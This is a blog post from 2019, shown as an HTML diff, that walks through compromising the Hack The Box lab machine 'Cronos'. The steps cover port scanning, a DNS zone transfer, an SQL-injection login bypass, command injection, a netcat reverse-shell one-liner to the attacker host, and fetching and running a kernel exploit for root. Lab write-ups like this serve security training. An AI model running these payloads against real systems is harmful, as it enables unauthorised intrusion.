@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Cronos -- hack the box</title>
+
+  
+  
+
+
+
+
+
+  
+  <meta name="author" content="Neal" />
+  <meta name="description" content="Introduction Target machine: 10.10.10.13(OS: linux)
+Kali linux: 10.10.16.44
+Enumeration Firstly, detect the open ports:
+nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.13  3 ports is open, detect the detailed services:
+namp -sV -sC -p22.53.80 -Pn -oA services 10.10.10.13  So we can conduct the relation of ports of ports and services as following:
+   port service     53 DNS   22 ssh   80 http    Exploitation http As the target machine provides http service, try to access http://10." />
+
+  
+  
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="@gohugoio" />
+    <meta name="twitter:title" content="Cronos -- hack the box" />
+    <meta name="twitter:description" content="Introduction Target machine: 10.10.10.13(OS: linux)
+Kali linux: 10.10.16.44
+Enumeration Firstly, detect the open ports:
+nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.13  3 ports is open, detect the detailed services:
+namp -sV -sC -p22.53.80 -Pn -oA services 10.10.10.13  So we can conduct the relation of ports of ports and services as following:
+   port service     53 DNS   22 ssh   80 http    Exploitation http As the target machine provides http service, try to access http://10." />
+    <meta name="twitter:image" content="https://neal1991.github.io/img/avatar.jpg" />
+  
+
+  
+  <meta property="og:type" content="article" />
+  <meta property="og:title" content="Cronos -- hack the box" />
+  <meta property="og:description" content="Introduction Target machine: 10.10.10.13(OS: linux)
+Kali linux: 10.10.16.44
+Enumeration Firstly, detect the open ports:
+nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.13  3 ports is open, detect the detailed services:
+namp -sV -sC -p22.53.80 -Pn -oA services 10.10.10.13  So we can conduct the relation of ports of ports and services as following:
+   port service     53 DNS   22 ssh   80 http    Exploitation http As the target machine provides http service, try to access http://10." />
+  <meta property="og:url" content="https://neal1991.github.io/post/cronos-hack-the-box/" />
+  <meta property="og:image" content="https://neal1991.github.io/img/avatar.jpg" />
+
+
+
+
+<meta name="generator" content="Hugo 0.37.1" />
+
+
+<link rel="canonical" href="https://neal1991.github.io/post/cronos-hack-the-box/" />
+<link rel="alternative" href="https://neal1991.github.io/index.xml" title="Neal&#39;s Blog" type="application/atom+xml" />
+
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<meta name="format-detection" content="telephone=no,email=no,adress=no" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+
+
+<meta name="robots" content="index,follow" />
+<meta name="referrer" content="origin-when-cross-origin" />
+<meta name="google-site-verification" content="_moDmnnBNVLBN1rzNxyGUGdPHE20YgbmrtzLIbxaWFc" />
+<meta name="msvalidate.01" content="22596E34341DD1D17D6022C44647E587" />
+
+
+
+
+
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+<meta name="apple-mobile-web-app-title" content="Neal&#39;s Blog" />
+<meta name="msapplication-tooltip" content="Neal&#39;s Blog" />
+<meta name='msapplication-navbutton-color' content="#5fbf5e" />
+<meta name="msapplication-TileColor" content="#5fbf5e" />
+<meta name="msapplication-TileImage" content="/img/tile-image-windows.png" />
+<link rel="icon" href="https://neal1991.github.io/img/favicon.ico" />
+<link rel="icon" type="image/png" sizes="16x16" href="https://neal1991.github.io/img/favicon-16x16.png" />
+<link rel="icon" type="image/png" sizes="32x32" href="https://neal1991.github.io/img/favicon-32x32.png" />
+<link rel="icon" sizes="192x192" href="https://neal1991.github.io/img/touch-icon-android.png" />
+<link rel="apple-touch-icon" href="https://neal1991.github.io/img/touch-icon-apple.png" />
+<link rel="mask-icon" href="https://neal1991.github.io/img/safari-pinned-tab.svg" color="#5fbf5e" />
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/video.js/6.2.8/alt/video-js-cdn.min.css" />
+
+<link rel="stylesheet" href="https://neal1991.github.io/css/bundle.css" />
+
+
+  
+  <!--[if lt IE 9]>
+    <script src="//cdn.bootcss.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="//cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
+    <script src="//cdn.bootcss.com/video.js/6.2.8/ie8/videojs-ie8.min.js"></script>
+  <![endif]-->
+
+<!--[if lte IE 11]>
+    <script src="//cdn.bootcss.com/classlist/1.1.20170427/classList.min.js"></script>
+  <![endif]-->
+
+
+<script src="//cdn.bootcss.com/object-fit-images/3.2.3/ofi.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/smooth-scroll/12.1.4/js/smooth-scroll.polyfills.min.js"></script>
+
+
+</head>
+  <body>
+    
+    <div class="suspension">
+      <a title="Go to top" class="to-top is-hide"><span class="icon icon-up"></span></a>
+      
+        
+        <a title="Go to comments" class="to-comment" href="#disqus_thread"><span class="icon icon-comment"></span></a>
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <img class="avatar" src="https://neal1991.github.io/img/avatar.jpg" alt="Avatar">
+  
+  <h2 class="title">Neal&#39;s Blog</h2>
+  
+  <p class="subtitle">Development &amp; Security</p>
+  <button class="menu-toggle" type="button">
+    <span class="icon icon-menu"></span>
+  </button>
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+            
+            
+            
+              is-active
+            ">
+            <a href="https://neal1991.github.io/">Home</a>
+          </li>
+      
+        <li class="menu-item
+            
+            
+            ">
+            <a href="https://github.com/neal1991">Works</a>
+          </li>
+      
+        <li class="menu-item
+            
+            
+            ">
+            <a href="https://neal1991.github.io/tags/">Tags</a>
+          </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list">
+
+      
+      <li class="social-item">
+        <a href="mailto:bing.ecnu@gmail.com" title="Email"><span class="icon icon-email"></span></a>
+      </li>
+
+      
+      <li class="social-item">
+        <a href="//github.com/neal1991" title="GitHub"><span class="icon icon-github"></span></a>
+      </li>
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <li class="social-item">
+        <a href="https://neal1991.github.io/index.xml"><span class="icon icon-rss" title="RSS"></span></a>
+      </li>
+
+    </ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Cronos -- hack the box</h1>
+      <p class="post-meta">@Neal · Mar 15, 2019 · 3 min read</p>
+    </header>
+    <article class="post-content">
+
+<p><img src="https://s2.ax1x.com/2019/03/14/AEpKkq.png" alt="AEpKkq.png" /></p>
+
+<h2 id="introduction">Introduction</h2>
+
+<p>Target machine: 10.10.10.13(OS: linux)</p>
+
+<p>Kali linux: 10.10.16.44</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>Firstly, detect the open ports:</p>
+
+<pre><code>nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.13
+</code></pre>
+
+<p><img src="https://github.com/neal1991/htb/blob/master/Cronos/openports.png" alt="openports" /></p>
+
+<p>3 ports is open, detect the detailed services:</p>
+
+<pre><code>namp -sV -sC -p22.53.80 -Pn -oA services 10.10.10.13
+</code></pre>
+
+<p><img src="https://github.com/neal1991/htb/blob/master/Cronos/services.png" alt="services" /></p>
+
+<p>So we can conduct the relation of ports of ports and services as following:</p>
+
+<table>
+<thead>
+<tr>
+<th>port</th>
+<th>service</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>53</td>
+<td>DNS</td>
+</tr>
+
+<tr>
+<td>22</td>
+<td>ssh</td>
+</tr>
+
+<tr>
+<td>80</td>
+<td>http</td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<h3 id="http">http</h3>
+
+<p>As the target machine provides http service, try to access <code>http://10.10.10.13</code></p>
+
+<p><img src="https://github.com/neal1991/htb/blob/master/Cronos/80.png" alt="default web" /></p>
+
+<p>Default apache web page, nothing new. So try to brute force <code>http://10.10.10.13/</code> with dirbuster. After brute force for a period time, we have not found anything new.</p>
+
+<h3 id="dns">DNS</h3>
+
+<p>As the target machine owns DNS service. It is common to check zone transfer with <code>dig</code>. As we can have a guess of the dns domain of <code>cronos.htb</code>. So zone transfer can be checked by:</p>
+
+<pre><code>dig axfr @10.10.10.13 cronos.htb
+</code></pre>
+
+<p><img src="https://github.com/neal1991/htb/blob/master/Cronos/dns.png" alt="dns" /></p>
+
+<p>An interestring domain name <code>admin.cronos.htb</code> is found. So add an entry into <code>/etc/hosts</code>:</p>
+
+<pre><code>10.10.10.13    admin.cronos.htb
+</code></pre>
+
+<p>Try to access <code>admin.cronos.htb</code> in the browser, a login web page is displayed. Yep, it is what we want. It seems that the login is quite simple. Try to login with sql injection with the username of <code>admin ' or '1' = '1</code>, the password can be anything.</p>
+
+<p><img src="https://github.com/neal1991/htb/blob/master/Cronos/login.png" alt="login" /></p>
+
+<p><img src="https://github.com/neal1991/htb/blob/master/Cronos/pass.png" alt="pass" /></p>
+
+<p>Magic! We are in. It seems that it is a network tool. However, it seems that it has exposed the ability to execute command remotely. Have a test of <code>8888&amp;whoami</code>:</p>
+
+<p><img src="https://github.com/neal1991/htb/blob/master/Cronos/whoami.png" alt="whoami" /></p>
+
+<p>The result is <code>www-data</code>. Obviously, the command can executed properly. Now try to reverse the shell. Try to listen to port <code>1234</code> by nc in our kali:</p>
+
+<pre><code>nc -lvnp 1234
+</code></pre>
+
+<p>Then use the bash reverse shell command:</p>
+
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.44 1234 &gt;/tmp/f
+</code></pre>
+
+<p>Wait for server second, shell is return. Wonderful!</p>
+
+<p><img src="https://github.com/neal1991/htb/blob/master/Cronos/nc.png" alt="nc" /></p>
+
+<p>Try to obtain a tty terminal:</p>
+
+<pre><code>python -c &quot;import pty;pty.spawn('/bin/sh')&quot;
+</code></pre>
+
+<p>Obviously, the user role can be obtained. Go the <code>home</code> folder and <code>ls</code>， then go into the user folder to get user.txt.</p>
+
+<h2 id="privilege-escalation">Privilege escalation</h2>
+
+<p>It&rsquo;s time to get the root role. See the kernel of the target machine:</p>
+
+<pre><code>uname -a
+</code></pre>
+
+<p>Google linux kernel privilege escalation, find a <a href="https://www.exploit-db.com/exploits/44298">payload</a></p>
+
+<p><img src="https://s2.ax1x.com/2019/03/15/AEmLVK.png" alt="AEmLVK.png" /></p>
+
+<p>Server a http server to provide the payload, name it as exploit.c:</p>
+
+<pre><code>pythoon -m SimpleHTTPServer 80
+</code></pre>
+
+<p>There are serveal ways to provide http file services, including: php, apache, python, etc. Pyhton is quite convinient. Then download the <code>exploit.c</code> in the target machine:</p>
+
+<pre><code>wget http://10.10.16.22/exploit.c
+</code></pre>
+
+<p>Then try to compile it with gcc. Opps, gcc seems has not been installed in the target machine. In general, linux will install gcc. Whatever, compile the <code>exploit.c</code> in kali:</p>
+
+<pre><code>gcc exploit.c -o exploit
+</code></pre>
+
+<p>Remember to download the file from a folder with permission, just like <code>/tmp</code>:</p>
+
+<pre><code>cd /tmp
+wget http://10.10.16.44/exploit
+</code></pre>
+
+<p>Make sure to have execution perssion by:</p>
+
+<pre><code>chmod +x exploit
+</code></pre>
+
+<p>Just execute it by <code>./exploit</code>. Wow, now see whoami.</p>
+
+<p><img src="https://github.com/neal1991/htb/blob/master/Cronos/root.png" alt="root" /></p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>The target machine is quite straitforward. The basic point is the zone transfer of DNS exploit. And other steps is not difficult with basic knowledges including: sql injection, reverse shell, etc.</p>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="https://neal1991.github.io/tags/%E5%AE%89%E5%85%A8"><span class="tag">安全</span></a></li>
+        
+          <li><a href="https://neal1991.github.io/tags/hack-the-box"><span class="tag">Hack the Box</span></a></li>
+        
+          <li><a href="https://neal1991.github.io/tags/walkthrough"><span class="tag">Walkthrough</span></a></li>
+        
+          <li><a href="https://neal1991.github.io/tags/linux"><span class="tag">Linux</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.
+      </p>
+    </footer>
+    
+      <div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "nealecnu" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+      
+    
+  </section>
+  <footer class="site-footer">
+  <p>© 2017-2019 Neal&#39;s Blog</p>
+  <p>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></p>
+  
+</footer>
+
+
+
+<script async src="//cdn.bootcss.com/video.js/6.2.8/alt/video.novtt.min.js"></script>
+<script async src="//cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    }
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+<script src="https://neal1991.github.io/js/bundle.js"></script>
+
+
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-104405154-2', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='//www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+  </body>
+</html>
